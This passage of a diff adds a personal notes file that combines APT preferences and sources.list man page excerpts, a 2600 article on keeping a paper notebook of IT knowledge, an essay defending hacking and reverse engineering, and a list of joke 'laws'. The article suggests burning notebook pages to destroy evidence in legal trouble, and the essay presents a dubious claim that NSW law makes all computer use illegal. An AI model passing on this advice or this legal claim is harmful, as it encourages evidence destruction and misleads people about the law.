+		names the release version. For example, the packages in the tree might belong to Debian release version 7.0. Note that there is normally no version number for the testing and unstable distributions because they have not been released yet. Specifying this in the APT preferences file would require one of the following lines.
+
+		Pin: release v=7.0
+		Pin: release a=stable, v=7.0
+		Pin: release 7.0
+
+	the Component: line
+		names the licensing component associated with the packages in the directory tree of the Release file. For example, the line "Component: main" specifies that all the packages in the directory tree are from the main component, which entails that they are licensed under terms listed in the Debian Free Software Guidelines. Specifying this component in the APT preferences file would require the line:
+
+		Pin: release c=main
+
+	the Origin: line
+		names the originator of the packages in the directory tree of the Release file. Most commonly, this is Debian. Specifying this origin in the APT preferences file would require the line:
+		
+		Pin: release o=Debian
+
+	the Label: line
+		names the label of the packages in the directory tree of the Release file. Most commonly, this is Debian. Specifying this label in the APT preferences file would require the line:
+		
+		Pin: release l=Debian
+
+All of the Packages and Release files retrieved from locations listed in the sources.list(5) file are stored in the directory /var/lib/apt/lists, or in the file named by the variable Dir::State::Lists in the apt.conf file. For example, the file debian.lcs.mit.edu_debian_dists_unstable_contrib_binary-i386_Release contains the Release file retrieved from the site debian.lcs.mit.edu for binary-i386 architecture files from the contrib component of the unstable distribution.
+
+Optional Lines in an APT Preferences Record
+Each record in the APT preferences file can optionally begin with one or more lines beginning with the word Explanation:. This provides a place for comments.
+
+EXAMPLE
+Tracking Stable
+	The following APT preferences file will cause APT to assign a priority higher than the default (500) to all package versions belonging to a stable distribution and a prohibitively low priority to package versions belonging to other Debian distributions.
+	
+	Explanation: Uninstall or do not install any Debian-originated
+	Explanation: package versions other than those in the stable distro
+	Package: *
+	Pin: release a=stable
+	Pin-Priority: 900
+	
+	Package: *
+	Pin: release o=Debian
+	Pin-Priority: -10
+
+With a suitable sources.list(5) file and the above preferences file, any of the following commands will cause APT to upgrade to the latest stable version(s).
+	apt-get install package-name
+	apt-get upgrade
+	apt-get dist-upgrade
+
+The following command will cause APT to upgrade the specified package to the latest version from the testing distribution; the package will not be upgraded again unless this command is given again.
+
+	apt-get install package/testing
+
+EXAMPLE
+Tracking Testing or Unstable
+	The following APT preferences file will cause APT to assign a high priority to package versions from the testing distribution, a lower priority to package versions from the unstable distribution, and a prohibitively low priority to package versions from other Debian distributions.
+	
+	Package: *
+	Pin: release a=testing
+	Pin-Priority: 900
+	
+	Package: *
+	Pin: release a=unstable
+	Pin-Priority: 800
+	
+	Package: *
+	Pin: release o=Debian
+	Pin-Priority: -10
+
+With a suitable sources.list(5) file and the above preferences file, any of the following commands will cause APT to upgrade to the latest testing version(s).
+
+	apt-get install package-name
+	apt-get upgrade
+	apt-get dist-upgrade
+	
+The following command will cause APT to upgrade the specified package to the latest version from the unstable distribution. Thereafter, apt-get upgrade will upgrade the package to the most recent testing version if that is more recent than the installed version, otherwise, to the most recent unstable version if that is more recent than the installed version.
+
+	apt-get install package/unstable
+
+EXAMPLE
+Tracking the evolution of a codename release
+The following APT preferences file will cause APT to assign a priority higher than the default (500) to all package versions belonging to a specified codename of a distribution and a prohibitively low priority to package versions belonging to other Debian distributions, codenames and archives. Note that with this APT preference APT will follow the migration of a release from the archive testing to stable and later oldstable. If you want to follow for example the progress in testing notwithstanding the codename changes you should use the example configurations above.
+
+	Explanation: Uninstall or do not install any Debian-originated package versions
+	Explanation: other than those in the distribution codenamed with jessie or sid
+	Package: *
+	Pin: release n=jessie
+	Pin-Priority: 900
+	
+	Explanation: Debian unstable is always codenamed with sid
+	Package: *
+	Pin: release n=sid
+	Pin-Priority: 800
+	
+	Package: *
+	Pin: release o=Debian
+	Pin-Priority: -10
+	
+With a suitable sources.list(5) file and the above preferences file, any of the following commands will cause APT to upgrade to the latest version(s) in the release codenamed with jessie.
+	apt-get install package-name
+	apt-get upgrade
+	apt-get dist-upgrade
+
+The following command will cause APT to upgrade the specified package to the latest version from the sid distribution. Thereafter, apt-get upgrade will upgrade the package to the most recent jessie version if that is more recent than the installed version, otherwise, to the most recent sid version if that is more recent than the installed version.
+
+	apt-get install package/sid
+
+FILES
+       /etc/apt/preferences
+           Version preferences file. This is where you would specify
+           "pinning", i.e. a preference to get certain packages from a
+           separate source or from a different version of a distribution.
+           Configuration Item: Dir::Etc::Preferences.
+
+       /etc/apt/preferences.d/
+           File fragments for the version preferences. Configuration Item:
+           Dir::Etc::PreferencesParts.
+
+    __   _          __          _      __                                   _ _     _   
+   / /__| |_ ___   / /_ _ _ __ | |_   / /__  ___  _   _ _ __ ___ ___  ___  | (_)___| |_ 
+  / / _ \ __/ __| / / _` | '_ \| __| / / __|/ _ \| | | | '__/ __/ _ \/ __| | | / __| __|
+ / /  __/ || (__ / / (_| | |_) | |_ / /\__ \ (_) | |_| | | | (_|  __/\__ \_| | \__ \ |_ 
+/_/ \___|\__\___/_/ \__,_| .__/ \__/_/ |___/\___/ \__,_|_|  \___\___||___(_)_|_|___/\__|
+-------------------------------------------------------------------
+DESCRIPTION
+       The source list /etc/apt/sources.list is designed to support any number of active sources and a variety of source media.
+       The file lists one source per line, with the most preferred source listed first. The information available from the
+       configured sources is acquired by apt-get update (or by an equivalent command from another APT front-end).
+
+       Each line specifying a source starts with type (e.g.  deb-src) followed by options and arguments for this type. Individual
+       entries cannot be continued onto a following line. Empty lines are ignored, and a # character anywhere on a line marks the
+       remainder of that line as a comment.
+
+SOURCES.LIST.D
+       The /etc/apt/sources.list.d directory provides a way to add sources.list entries in separate files. The format is the same
+       as for the regular sources.list file. File names need to end with .list and may only contain letters (a-z and A-Z), digits
+       (0-9), underscore (_), hyphen (-) and period (.) characters. Otherwise APT will print a notice that it has ignored a file,
+       unless that file matches a pattern in the Dir::Ignore-Files-Silently configuration list - in which case it will be
+       silently ignored.
+
+THE DEB AND DEB-SRC TYPES
+       The deb type references a typical two-level Debian archive, distribution/component. The distribution is generally an
+       archive name like stable or testing or a codename like wheezy or jessie while component is one of main, contrib or
+       non-free. The deb-src type references a Debian distribution's source code in the same form as the deb type. A deb-src line
+       is required to fetch source indexes.
+
+       The format for a sources.list entry using the deb and deb-src types is:
+
+           deb [ options ] uri distribution [component1] [component2] [...]
+
+       The URI for the deb type must specify the base of the Debian distribution, from which APT will find the information it
+       needs.  distribution can specify an exact path, in which case the components must be omitted and distribution must end
+       with a slash (/). This is useful for the case when only a particular sub-section of the archive denoted by the URI is of
+       interest. If distribution does not specify an exact path, at least one component must be present.
+
+       distribution may also contain a variable, $(ARCH) which expands to the Debian architecture (such as amd64 or armel) used
+       on the system. This permits architecture-independent sources.list files to be used. In general this is only of interest
+       when specifying an exact path, APT will automatically generate a URI with the current architecture otherwise.
+
+       Since only one distribution can be specified per line it may be necessary to have multiple lines for the same URI, if a
+       subset of all available distributions or components at that location is desired. APT will sort the URI list after it has
+       generated a complete set internally, and will collapse multiple references to the same Internet host, for instance, into a
+       single connection, so that it does not inefficiently establish an FTP connection, close it, do something else, and then
+       re-establish a connection to that same host. This feature is useful for accessing busy FTP sites with limits on the number
+       of simultaneous anonymous users. APT also parallelizes connections to different hosts to more effectively deal with sites
+       with low bandwidth.
+
+       options is always optional and needs to be surrounded by square brackets. It can consist of multiple settings in the form
+       setting=value. Multiple settings are separated by spaces. The following settings are supported by APT (note however that
+       unsupported settings will be ignored silently):
+
+       ·   arch=arch1,arch2,...  can be used to specify for which architectures information should be downloaded. If this option
+           is not set all architectures defined by the APT::Architectures option will be downloaded.
+
+       ·   trusted=yes can be set to indicate that packages from this source are always authenticated even if the Release file is
+           not signed or the signature can't be checked. This disables parts of apt-secure(8) and should therefore only be used
+           in a local and trusted context.  trusted=no is the opposite which handles even correctly authenticated sources as not
+           authenticated.
+
+       It is important to list sources in order of preference, with the most preferred source listed first. Typically this will
+       result in sorting by speed from fastest to slowest (CD-ROM followed by hosts on a local network, followed by distant
+       Internet hosts, for example).
+
+       Some examples:
+
+           deb http://ftp.debian.org/debian wheezy main contrib non-free
+           deb http://security.debian.org/ wheezy/updates main contrib non-free
+
+URI SPECIFICATION
+       The currently recognized URI types are:
+
+       file
+           The file scheme allows an arbitrary directory in the file system to be considered an archive. This is useful for NFS
+           mounts and local mirrors or archives.
+
+       cdrom
+           The cdrom scheme allows APT to use a local CD-ROM drive with media swapping. Use the apt-cdrom(8) program to create
+           cdrom entries in the source list.
+
+       http
+           The http scheme specifies an HTTP server for the archive. If an environment variable http_proxy is set with the format
+           http://server:port/, the proxy server specified in http_proxy will be used. Users of authenticated HTTP/1.1 proxies
+           may use a string of the format http://user:pass@server:port/. Note that this is an insecure method of authentication.
+
+       ftp
+           The ftp scheme specifies an FTP server for the archive. APT's FTP behavior is highly configurable; for more
+           information see the apt.conf(5) manual page. Please note that an FTP proxy can be specified by using the ftp_proxy
+           environment variable. It is possible to specify an HTTP proxy (HTTP proxy servers often understand FTP URLs) using
+           this environment variable and only this environment variable. Proxies using HTTP specified in the configuration file
+           will be ignored.
+
+       copy
+           The copy scheme is identical to the file scheme except that packages are copied into the cache directory instead of
+           used directly at their location. This is useful for people using removable media to copy files around with APT.
+
+       rsh, ssh
+           The rsh/ssh method invokes RSH/SSH to connect to a remote host and access the files as a given user. Prior
+           configuration of rhosts or RSA keys is recommended. The standard find and dd commands are used to perform the file
+           transfers from the remote host.
+
+       adding more recognizable URI types
+           APT can be extended with more methods shipped in other optional packages, which should follow the naming scheme
+           apt-transport-method. For instance, the APT team also maintains the package apt-transport-https, which provides access
+           methods for HTTPS URIs with features similar to the http method. Methods for using e.g. debtorrent are also available
+           - see apt-transport-debtorrent(1).
+
+EXAMPLES
+       Uses the archive stored locally (or NFS mounted) at /home/jason/debian for stable/main, stable/contrib, and
+       stable/non-free.
+
+           deb file:/home/jason/debian stable main contrib non-free
+
+       As above, except this uses the unstable (development) distribution.
+
+           deb file:/home/jason/debian unstable main contrib non-free
+
+       Source line for the above
+
+           deb-src file:/home/jason/debian unstable main contrib non-free
+
+       The first line gets package information for the architectures in APT::Architectures while the second always retrieves
+       amd64 and armel.
+
+           deb http://ftp.debian.org/debian wheezy main
+           deb [ arch=amd64,armel ] http://ftp.debian.org/debian wheezy main
+
+       Uses HTTP to access the archive at archive.debian.org, and uses only the hamm/main area.
+
+           deb http://archive.debian.org/debian-archive hamm main
+
+       Uses FTP to access the archive at ftp.debian.org, under the debian directory, and uses only the wheezy/contrib area.
+
+           deb ftp://ftp.debian.org/debian wheezy contrib
+
+       Uses FTP to access the archive at ftp.debian.org, under the debian directory, and uses only the unstable/contrib area. If
+       this line appears as well as the one in the previous example in sources.list a single FTP session will be used for both
+       resource lines.
+
+           deb ftp://ftp.debian.org/debian unstable contrib
+
+       Uses HTTP to access the archive at ftp.tlh.debian.org, under the universe directory, and uses only files found under
+       unstable/binary-i386 on i386 machines, unstable/binary-amd64 on amd64, and so forth for other supported architectures.
+       [Note this example only illustrates how to use the substitution variable; official debian archives are not structured like
+       this]
+
+           deb http://ftp.tlh.debian.org/universe unstable/binary-$(ARCH)/
+
+ ____                      _      _         _   _      _           
+/ ___|  __ ___   _____  __| |    / \   _ __| |_(_) ___| | ___  ___ 
+\___ \ / _` \ \ / / _ \/ _` |   / _ \ | '__| __| |/ __| |/ _ \/ __|
+ ___) | (_| |\ V /  __/ (_| |  / ___ \| |  | |_| | (__| |  __/\__ \
+|____/ \__,_| \_/ \___|\__,_| /_/   \_\_|   \__|_|\___|_|\___||___/
+-------------------------------------------------------------------
+Why You Need a Grimoire
+by Leviathan
+This article was published in Volume Twenty-Seven, Number Two, Summer 2010 article of 2600 The Hacker Quarterly.
+
+No matter how long you have been hacking, surfing, or working in IT, and especially in these uncertain times when your activity can be sniffed, parsed, logged, and archived, you need a grimoire.
+Dictionary.com defines a grimiore as "a manual of black magic (for invoking spirits and demons)." Those of us who have been pushing bits around for some time know that the things we routinely accomplish can sometimes appear to be black magic to the less technically adept among us. The sheer volume of information we have stuck in our craniums and bookmarks, and our ability to Google with precision, gives us an edge in finding and implementing all sorts of technology magic. This is all good.
+But it's not perfect, you know. We forget things. A website that we KNOW contained the answer last week, is suddenly gone. The transient nature of that big beast we call the Internet means that all content is in flux. And by the way, are you tired of the many tech support sites, powered by ad after ad, where you have to register before they'll let you click on the answer to your question?
+To paraphrase Dennis Hopper: "You, my friend, you need a grimoire."
+To the uninitiated, it looks just like a plain, bound notebook. But to you, and to the minions who watch in awe as you use it, it is truly a book of spells. You have the answers, because everything of value you've come across in your technology dealings, you've recorded faithfully in your grimoire.
+A grimoire is not pretty. It's not always well-organized. But the answers are there, because you put them there. It's your insurance policy, your journal, your database. In time you will come to know exactly where everything is.
+Best of all, it's private. No amount of ISP chicanery, keystroke logging, or site monitoring will ever create another copy of your grimoire. It will never slip a cookie or prompt you to install another damned plug-in.
+That, ummm, marginal URL that you really don't want in your bookmarks? Into the grimoire it goes. Default (factory) passwords? Never know when you'll need those. Write 'em down.
+That UNIX command with the mile-long unreadable man(1) page? Write down exactly how you use the command in real life, using only the options that are most useful to you. That unsupported hack that made your video card come alive... what happens if you have you have to reload the OS? Catalog it with care.
+Account names and passwords: be careful here. Most of us have a handfull of good, strong passwords we use all the time. Write down only the first two or three characters, and fill in the rest with random letters. Same with user IDs. No unintended reader will ever determine your complete password from w9xxxxxxxx. But knowing the starting letters will allow you to remember it.
+Now this part should be obvious: my grimoire goes everywhere I go, no exceptions. It's always available to me regardless of where I am or what other resources there are.
+If you accumulate as much information as I have (my grimoire is about 12 years old, with new entries written in the margins now), you and your book will become the stuff of legends. When I walk into a meeting and put it down on the table, I inevitably get the question, along with a stare of admiration: "Is that the book?" I smile in reply.
+And if, saints forbid, you should ever be in an embaressing legal situation and you have to get rid of its evidence quickly, tear out the offending pages, shed a few tears, then flick your Bic. Let's see you clean up a hard drive that cleanly. Privacy, my friends; it is priceless. If your dealing are not quite that dramatic, your grimiore is a good reference at review time or when preparing your resume.
+So spend a few wise dollars and obtain a good quality, bound notebook with lined archive paper, and start filling it with your accumulated IT wisdom. You and your grimoire will make history.
+
+-------------------------------------------------------------------
+What Is Hacking and Reverse Engineering
+Written by cypher-neo
+
+It is amazing, and rather disconcerting, to realize how much software we run without knowing for sure what it does. We buy software off the shelf in shrink wrapped packages. We run setup utilities that install numerous files, change system settings, delete or disable older versions and superseded utilities, and modify critical registry files. Every time we access a Web site, we may invoke or interact with dozens of programs and code segments that are necessary to give us the intended look, feel, and behavior. We purchase CD's with hundreds of games and utilities or download them as shareware. We exchange useful programs with colleagues and friends when we have tried only a fraction of each program’s features.
+Then, we download updates and install patches, trusting that the vendors are sure that the changes are correct and complete. We blindly hope that the latest change to each program keeps it compatible with all of the rest of the programs on our system. We rely on much software that we do not understand and do not know very well at all.
+Many people fear hackers because they have been instilled with a negative view from the press, however, you owe many advancements made in computer software and hardware to hacking.
+Hacker is a term used to describe different types of computer experts, who employ a tactical, rather than strategic, approach to computer programming, administration, or security. In computer programming, hacker means a programmer who hacks or reaches a goal by employing a series of small changes or additions to extend existing code and/or resources. In technical fields outside of computing, hacker is sometimes extended to mean an expert who has particularly detailed knowledge and uses this knowledge to cleverly circumvent limits to reach solutions.
+Hacker means different things to some people.
+	To the popular press: means someone who breaks into computers
+	Among programmers: it means a good programmer
+But the two meanings are connected. To programmers, "hacker" connotes mastery in the most literal sense. A hacker is someone who can make a computer do what he wants - whether the computer wants to or not.
+To add to the confusion, the noun "hack" also has two senses. It can be either a compliment or an insult. It's called a hack when you do something in an ugly way. But when you do something so clever that you somehow beat the system, that's also called a hack. The word is used more often in the former than the latter sense, probably because ugly solutions are more common than brilliant ones.
+Notice the definition given for the word "hack" according to the Encarta Dictionary for a good example of the two tenses to this word.
+	computer enthusiast: somebody who is interested or skilled in computer technology and programming
+	amateur player: somebody who enjoys a sport but lacks skill in it
+Believe it or not, the two senses of "hack" are also connected. Ugly and imaginative solutions have something in common: they both break the rules. And there is a gradual continuum between rule breaking that's merely ugly (using duct tape to attach something to your bike) and rule breaking that is brilliantly imaginative (discarding Euclidean space).
+As a hacker myself, I have often been criticized for the stand I take on computer technology, and when people get over their shock usually ask me, “How can you possibly condone hacking and reverse engineering?”
+These questions are usually prompted by a limited understanding of hacking, and the fact that the negative connotation of both fields is frequently touted in the press.
+To many people, the idea of hacking may conjure up stylized images of electronic vandalism, espionage, dyed hair, and body piercings. Most people associate hacking with breaking the law, therefore dubbing all those who engage in hacking activities to be criminals. Granted, there are people out there who use hacking techniques to break the law, but hacking isn't really about that. In fact, hacking is more about following the law than breaking it.
+The essence of hacking is finding unintended or overlooked uses for the laws and properties of a given situation and then applying them in new and inventive ways to solve a problem.
+Hacking is a tool... much like a stethoscope is a tool. A stethoscope could be used by a burglar to listen to the lock mechanism of a safe as the tumblers fall in place. But the same stethoscope could be used by your family doctor to detect breathing or heart problems. Or, it could be used by a computer technician to listen closely to the operating sounds of a sealed disk drive to diagnose a problem without exposing the drive to potentially-damaging dust and pollen.
+The tool is not inherently good or bad. The issue is the use to which the tool is put. It is much the same with hacking; it is not inherently good or evil unless it is used to good or evil purposes.
+It says a great deal about our work that we use the same word for a brilliant or a horribly cheesy solution. When we cook one up we're not always 100% sure which kind it is. But as long as it has the right sort of wrongness, that's a promising sign. It's odd that people think of programming as precise and methodical. Computers are precise and methodical. Hacking is something you do with a gleeful laugh.
+Reverse engineering is a process where an engineered artifact (be it a car, jet engine, or software program) is deconstructed in a way that reveals its innermost details, such as its design and architecture.
+In the software world reverse engineering boils down to taking an existing program for which source-code or proper documentation is not available and attempting to recover details regarding its’ design and implementation.
+Hacking and reverse engineering is particularly useful in modern software analysis for a wide variety of purposes:
+
+	Finding malicious code: Many virus and malware detection techniques use reverse engineering to understand how abhorrent code is structured and functions.
+	Discovering unexpected flaws and faults: Even the most well-designed system can have holes that result from the nature of our “forward engineering” development techniques. Reverse engineering can help identify flaws and faults before they become mission-critical software failures.
+	Finding the use of others' code: In supporting the cognizant use of intellectual property, it is important to understand where protected code or techniques are used in applications. Reverse engineering techniques can be used to detect the presence or absence of software elements of concern.
+	Finding the use of shareware and open source code where it was not intended to be used: In the opposite of the infringing code concern, if a product is intended for security or proprietary use, the presence of publicly available code can be of concern. Reverse engineering enables the detection of code replication issues.
+	Learning from others' products of a different domain or purpose: Reverse engineering techniques can enable the study of advanced software approaches and allow new students to explore the products of masters. This can be a very useful way to learn and to build on a growing body of code knowledge. Many Web sites have been built by seeing what other Web sites have done. Many Web developers learned HTML and Web programming techniques by viewing the source of other sites.
+	Discovering features or opportunities that the original developers did not realize: Code complexity can foster new innovation. Existing techniques can be reused in new contexts. Reverse engineering can lead to new discoveries about software and new opportunities for innovation.
+It is by poking about inside current technology that hackers get ideas for the next generation.
+"No thanks", some may say, "outside help is not needed."
+But they're wrong. The next generation of computer technology has often - perhaps more often than not - been developed by outsiders.
+In 1977 there was no doubt some group within IBM developing what they expected to be the next generation of business computer. They were mistaken. The next generation of business computer was being developed on entirely different lines by two long-haired guys called Steve in a garage in Los Altos. At about the same time, the powers that be were cooperating to develop the official next generation operating system, Multics. But two guys who thought Multics excessively complex went off and wrote their own. They gave it a name that was a joking reference to Multics: Unix.
+And it was the simpler Unix that led the computer revolution, not Multics.
+But what hackers fear the most is today becoming a reality! The latest intellectual property laws impose unprecedented restrictions on the sort of poking around that leads to new ideas. In the past, a competitor might use patents to prevent you from selling a copy of something they made, but they couldn't prevent you from taking one apart to see how it worked. The latest laws make this a crime. How are we to develop new technology if we can't study current technology to figure out how to improve it?
+Data is by definition easy to copy. And the Internet makes copies easy to distribute. So it is no wonder companies are afraid. But, as so often happens, fear has clouded their judgment. The government has responded with draconian laws to protect intellectual property. They probably mean well. But they may not realize that such laws will do more harm than good.
+Breaking the rules should NOT be something that also breaks the law. What hackers fear most is that the government will discover too late that the very laws that they made for their protection are what causes them to fall. Unlike high tax rates, governments can't repeal totalitarianism if it turns out to be a mistake.
+This is why hackers worry. The government spying on people doesn't literally make programmers write worse code. It just leads eventually to a world in which bad ideas will win since there will be no one around to hack into the program and make it better. And because this is so important to hackers, they're especially sensitive to it.
+A good example of one law which scares me is the law regarding computer use in New South Wales, Australia. Section 310 of the Crimes Act 1900 states that:
+"A person who intentionally (a.) destroys, erases or alters data stored in or inserts data into a computer; or (b.) interferes with, or interrupts or obstructs the lawful use of a computer..." can be punished by severe prison sentences.
+It might sound like a good law on the surface but look at it closer. Remember the description of most computer users at the beginning of this entry... is there any computer operation that doesn't "erase", "alter", "destroy", or "insert" data into a computer? No, there isn't!
+And what exactly does it mean when it says "obstructs the lawful use of a computer?" Isn't the lawful use of a computer that computer users be allowed to "erase", "alter", "destroy", or "insert" data into a computer? Yes.
+This law makes computer use simultaneously illegal and legal at the same time! By this law, anyone who uses a computer can be thrown in jail for up to 10 years, or completely pardoned! Interestingly, New South Wales is one of the most proactive states in the world in prosecuting computer-related crimes.
+After I wrote this entry I did receive an answer to emails I sent to several Australian law firms. According to one email I recieved, "The NSW law prohibiting computer use is phrased that way since it can frequently be difficult to determine whether or not a person had malicious intent (which is a difficulty raised with the penal codes used in other Australian states). The way the law in NSW is phrased, what is prosecuted is not the intention but the computer use itself. The law in NSW is phrased to make any computer use illegal so as to give the government the greatest scope in prosecuting crimes of a computer nature, without having to worry about the intent behind the computer use."
+What makes some of these totalitarianism laws so scary is that most hacking isn't about doing things illegal; it's about learning and expanding knowledge. This totalitarianism law of NSW actually threatens letting people expand their knowledge of computer by threatening to make ALL computer use illegal and prosecutable at the whim of whoever is in power at the time!!
+The law may sound reasonable on the surface, and the explanation may sound like a laudable reason on the surface... but totalitarianism by its' very nature prohibits growth and learning.
+I am a hacker. As such I promise to always tout good (hacked, tested, reverse-engineered) ideas on this blog.
+Keep hacking alive.
+Keep good, tested ideas flowing.
+Keep thinking outside the box.
+Hacking and reverse-engineering should not be illegal when used to benefit others.
+
+-------------------------------------------------------------------
+ACTION'S LAW
+    Power tends to corrupt; absolute power corrupts absolutely.
+
+ALBRECHT'S LAW
+    Social innovations tend to the level of minimum tolerable well-being.
+
+ALLEN'S (or CANN'S) AXIOM
+    When all else fails, read the instructions.
+
+BOREN'S FIRST LAW
+    When in doubt, mumble.
+
+BO DIDDELEY'S OBSERVATION ON THE LAW:
+   Always take a lawyer with you, and bring another lawyer to watch him.
+
+BOVE'S THEOREM
+    The remaining work to finish in order to reach your goal increases as the deadline approaches.
+
+BOWIE'S THEOREM
+    If an experiment works, you must be using the wrong equipment.
+
+BRILLIANT'S OBSERVATION ON MODERN ART:
+   Not all our artists are playing a joke on the public.
+   Some are genuinely mad.
+
+BRILLIANT'S LAW OF LIMITED AMBITION:
+   If you can't learn how to do it well learn how to enjoy doing it poorly.
+
+BROOK'S LAW
+    Adding manpower to a late software project makes it later.
+
+CANADA BILL JONES' MOTTO
+    It's morally wrong to allow naive end users to keep their money.
+
+CANN'S (or ALLEN'S) AXIOM
+    When all else fails, read the instructions.
+
+CARLSON'S CONSOLATION
+    Nothing is ever a complete failure; it can always serve as a bad example.
+
+CLARKE'S THIRD LAW
+    Any sufficiently advanced technology is indistinguishable from magic.
+
+COHN'S LAW
+    The more time you spend in reporting on what you are doing, the less time you have to do anything. Stability is achieved when you spend all your time reporting on the nothing you are doing.
+
+CONWAY'S LAW
+    In any organization there will always be one person who knows what is going on. This person must be fired.
+
+LAW OF CONTINUITY
+    Experiments should be reproducible. They should all fail in the same way.
+
+CORRESPONDENCE COROLLARY
+    An experiment may be considered a success if no more than half of your data must be discarded to obtain correspondence with your theory.
+
+CROPP'S LAW
+    The amount of work done varies inversely with the amount of time spent in the office.
+
+CUTLER WEBSTER'S LAW
+    There are two sides to every argument, unless a person is personally involved, in which case there is only one.
+
+DEADLINE-DAN'S DEMO DEMONSTRATION
+    The higher the "higher-ups" are who've come to see your demo, the lower your chances are of giving a successful one.
+
+DEMIAN'S OBSERVATION
+    There is always one item on the screen menu that is mislabeled and should read "ABANDON HOPE ALL YE WHO ENTER HERE".
+
+DENNISTON'S LAW
+    Virtue is its own punishment.
+
+DOW'S LAW
+    In a hierarchical organization, the higher the level, the greater the confusion.
+
+DR. CALIGARI'S COME-BACK
+    A bad sector disk error occurs only after you've done several hours of work without performing a backup.
+
+ESTRIDGE'S LAW
+    No matter how large and standardized the marketplace is, IBM can redefine it.
+
+FINAGLE'S LAWS
+    1) Once a job is fouled up, anything done to improve it makes it worse.
+    2) No matter what results are expected, someone is always willing to fake it.
+    3) No matter what the result, someone is always eager to misinterpret it.
+    4) No matter what occurs, someone believes it happened according to his pet theory.
+
+FINAGLE'S RULES:
+    1) To study an application best, understand it thoroughly before you start.
+    2) Always keep a record of data. It indicates you've been working.
+    3) Always draw your curves, then plot the reading.
+    4) In case of doubt, make it sound convincing.
+    5) Program results should always be reproducible. They should all fail in the same way.
+    6) Do not believe in miracles. Rely on them.
+
+   FINAGLE'S LAW OF GOVERNMENT CONTRACTING:
+   Dealing with the government is like kicking a 300-pound sponge.
+
+   FINAGLE'S LAW OF MILITARY SUPERIORITY:
+   The bigger they are the harder they hit.
+
+FINSTER'S LAW
+    A closed mouth gathers no feet.
+
+FIRST RULE OF HISTORY
+    History doesn't repeat itself -- historians merely repeat each other.
+
+   FLO CAPP'S OBSERVATION:
+   The next best thing to doing something smart is not doing something stupid.
+
+FRANKLIN'S RULE
+    Blessed is the end user who expects nothing, for he/she will not be disappointed.
+
+GILB'S LAWS OF UNRELIABILITY
+    1) At the source of every error which is blamed on the computer you will find at least two human errors, including the error of blaming it on the computer.
+    2) Any system which depends on human reliability is unreliable.
+    3) Udetectable errors are infinite in variety, in contrast to detectable errors, which by definition are limited.
+    4) Investment in reliability will increase until it exceeds the probable cost of errors, or until someone insists on getting some useful work done.
+
+GINSBERG'S THEOREM
+    1) You can't win.
+    2) You can't break even.
+    3) You can't even quit the game.
+
+GLYME'S FORMULA FOR SUCCESS
+    The secret of success is sincerity.  Once you can fake that, you've got it made.
+
+GOEBEL'S LAW OF USELESS DIFFICULTY:
+   Just because it's hard doesn't mean it's worth the effort.
+
+GOEBEL'S SECOND LAW OF USELESS DIFFICULTY:
+   The fastest way to get something done is to determine that it isn't worth doing.
+
+GOEBEL'S LAW OF COMPUTER SUPPORT:
+   Troubleshooting a computer over the telephone is like having sex through a hole in a board fence.  It can be done but it is neither EASY nor PLEASANT.
+
+GOEBEL'S LAW OF SOFTWARE COMPATIBILITY:
+   A statement of absolute functional equivalence made in bold print followed by several pages of qualifications in fine.
+
+GOEBEL'S THEOREM OF SOFTWARE SCHEDULES:
+   Always multiply a software schedule by pi.  This is because you think you're going in a straight line but always end up going full circle.
+
+GOEBEL'S LAW OF PRODUCT INTRODUCTIONS:
+   A future product release date does NOT say when a product will be introduced.  All it says it that you don't have a chance in HELL of seeing it before that time.
+
+GOEBEL'S OBSERVATION ON UTOPIA:
+   If everyone believed in Peace
+   They would immediately begin fighting over the best way to achieve it.
+
+GOEBEL'S LAW OF INTELLECTUAL OBSCURITY:
+   WHAT FUN IS IT TO BE AN EXPERT IF YOU MAKE YOURSELF EASY TO UNDERSTAND?
+
+THE GOLDEN RULE OF ARTS AND SCIENCES
+    Whoever has the gold makes the rules.
+
+GOLD'S LAW
+    If the shoe fits, it's ugly.
+
+GORDON'S FIRST LAW
+    If a research project is not worth doing at all, it is not worth doing well.
+
+GOVERNMENT'S LAW
+    There is an exception to all laws.
+
+GREEN'S LAW OF DEBATE
+    Anything is possible if you don't know what you're talking about.
+
+GUMMIDGES'S LAW
+    The amount of expertise varies in inverse proportion to the number of statements understood by the general public.
+
+GUMPERSON'S LAW
+    The probability of a given event occurring is inversely proportional to its desirability.
+
+HANLON'S RAZOR
+    Never attribute to malice that which is adequately explained by stupidity.
+
+HARP'S COROLLARY TO ESTRIDGE'S LAW
+    Your "IBM PC-compatible" computer grows more incompatible with every passing moment.
+
+HARRISON'S POSTULATE
+    For every action, there is an equal and opposite criticism.
+
+HELLER'S LAW
+    The first myth of management is that it exists.
+
+HINDS' LAW OF COMPUTER PROGRAMMING
+    1) Any given program, when running, is obsolete.
+    2) If a program is useful, it will have to be changed.
+    3) If a program is useless, it will have to be documented.
+    4) Any given program will expand to fill all available memory.
+    5) The value of a program is proportional to the weight of its output.
+    6) Program complexity grows until it exceeds the capability of the programmer who must maintain it.
+    7) Make it possible for programmers to write programs in English, and you will find that programmers cannot write in English.
+
+HOARE'S LAW OF LARGE PROGRAMS
+    Inside every large program is a small program struggling to get out.
+
+HUBBARD'S LAW
+    Don't take life too seriously; you won't get out of it alive.
+
+JENKINSON'S LAW
+    It won't work.
+
+JOHNSON-LAIRD'S LAW
+    Toothache tends to start on Saturday night.
+
+LARKINSON'S LAW
+    All laws are basically false.
+
+THE LAST ONE'S LAW OF PROGRAM GENERATORS
+    A program generator creates programs that are more "buggy" than the program generator.
+
+LIEBERMAN'S LAW
+    Everybody lies; but it doesn't matter, since nobody listens.
+
+LYNCH'S LAW
+    When the going gets tough, everyone leaves.
+
+MASON'S FIRST LAW OF SYNERGISM
+    The one day you'd sell you soul for something, souls are a glut.
+
+MAY'S LAW
+    The quality of correlation is inverely proportional to the density of control. (The fewer the data points, the smoother the curves.)
+
+MENCKEN'S LAW
+    There is always an easy answer to every human problem -- neat, plausible, and wrong.
+
+MESKIMEN'S LAW
+    There's never time to do it right, but always time to do it over.
+
+MUIR'S LAW
+    When we try to pick out anything by itself, we find it hitched to everything else in the universe.
+
+MURPHY'S LAWS
+    1) If anything can go wrong, it will (and at the worst possible moment).
+    2) Nothing is as easy as it looks.
+    3) Everything takes longer than you think it will.
+
+MURPHY'S FOURTH LAW
+    If there is a possibility of several things going wrong, the one that will cause the most damage will be the one to go wrong.
+
+MURPHY'S LAW OF THERMODYNAMICS
+    Things get worse under pressure.
+
+NINETY-NINETY RULE OF PROJECT SCHEDULES
+    The first ninety percent of the task takes ninety percent of the time, and the last ten percent takes the other ninety percent.
+
+NIXON'S THEOREM
